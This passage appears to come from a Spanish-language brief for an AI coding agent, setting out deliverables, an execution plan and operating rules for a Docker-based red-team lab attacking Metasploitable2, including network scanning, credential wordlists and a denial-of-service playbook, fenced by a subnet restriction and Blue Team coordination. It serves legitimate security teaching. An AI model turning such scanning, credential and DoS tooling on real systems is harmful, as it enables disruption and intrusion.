## 8. Entregables del proyecto y mapeo a archivos

| Entregable exigido | Cómo se cumple en el repo |
|---|---|
| Documento con vulnerabilidades encontradas | `reports/Plan_Red_Team.docx` (sección 9) + tablas generadas a partir de `evidence/phase-2/` y `evidence/phase-3/` |
| Evidencia de ataques (capturas) | `evidence/phase-{4,5,6}/` con pcaps, logs, screenshots manuales |
| Descripción de las técnicas | `reports/Plan_Red_Team.docx` (sección 7) — ya redactado |
| Impacto logrado | `reports/Plan_Red_Team.docx` (sección 8) + `evidence/phase-6/<ts>/run.log` con métricas de DoS |
| Plantilla del informe final | (a generar por plan mode) `reports/INFORME_FINAL_template.docx` con secciones obligatorias y placeholders |

---

## 9. Plan de ejecución sugerido

Plan mode debe proponer un plan detallado, pero el flujo de alto nivel esperado es:

1. **Setup del repositorio** — crear estructura, `.gitignore`, `README.md` raíz.
2. **Docker stack** — implementar `docker-compose.yml` y `Dockerfile` del Kali. Validar levantamiento con `docker compose up -d`.
3. **Validación de conectividad** — desde Kali hacer `ping 172.20.0.20` y `nmap -sn 172.20.0.0/24` para confirmar que la red funciona.
4. **Library compartida** — implementar `scripts/lib/common.sh` y validar con un script trivial de prueba.
5. **Scripts por fase** — implementar fases 1 a 5 y validar cada una contra el target. Capturar evidencia limpia de prueba.
6. **Stack de observabilidad** — agregar `start-pcap.sh` y validar que se generan pcaps cuando los scripts corren.
7. **Playbook DoS** — implementar baseline, los tres vectores, monitor y recovery. Validar baseline y recovery sin ejecutar los vectores destructivos al inicio.
8. **Documentación** — `README.md` raíz con quickstart, `playbooks/dos-playbook.md` con la coordinación con Blue Team, `playbooks/evidence-format.md` con el estándar.
9. **Plantilla del informe final** — generar `.docx` con la estructura de las 8 secciones del informe.
10. **Dry run completo** — ejecutar todas las fases en orden contra Metasploitable2 y revisar que la evidencia generada es presentable.

---

## 10. Restricciones y reglas operativas

- **Toda actividad ofensiva ocurre en `lab-net`**. Ningún script debe permitir target externo a `172.20.0.0/24`. Plan mode debe agregar una validación al `common.sh` que rechace targets fuera de la subred.
- **Coordinación con Blue Team antes de cada fase disruptiva**, especialmente la 6 (DoS).
- **Bitácora desde el día 1**: cada script auto-genera log estructurado, pero el equipo agrega notas humanas en `evidence/phase-N/<ts>/notes.md`.
- **Capturas con terminal completa visible**: para screenshots manuales que vayan al informe, debe verse el comando completo, el timestamp del shell y el output.
- **Backup**: el repo debe estar en Git desde el día 1. Plan mode debe inicializar `.gitignore` que excluya `evidence/`, `*.pcap`, `*.log`, `*.tar.gz`, `.env`.
- **Política de credenciales**: ningún script asume credenciales; todas vienen de wordlists. Si se descubren credenciales en una fase, se documentan en evidencia local pero nunca se commitean.

---

## Notas finales para Claude Code

- El **Word doc `Plan_Red_Team.docx` ya existe** en `reports/`. No regenerarlo a menos que se pida explícitamente; sí complementarlo con la plantilla del informe final.
- **Metasploitable2** puede tener problemas de red en algunas configuraciones de Docker en macOS. Si plan mode detecta problemas, considerar build manual desde Ubuntu 22.04 con paquetes vulnerables específicos documentados.
- **Validar cada paso** con dry-run antes de pasar al siguiente. La velocidad sin validación produce evidencia inutilizable.
- **Si surge una decisión técnica no contemplada** en este brief, plan mode debe pausar y preguntar antes de tomarla por su cuenta.
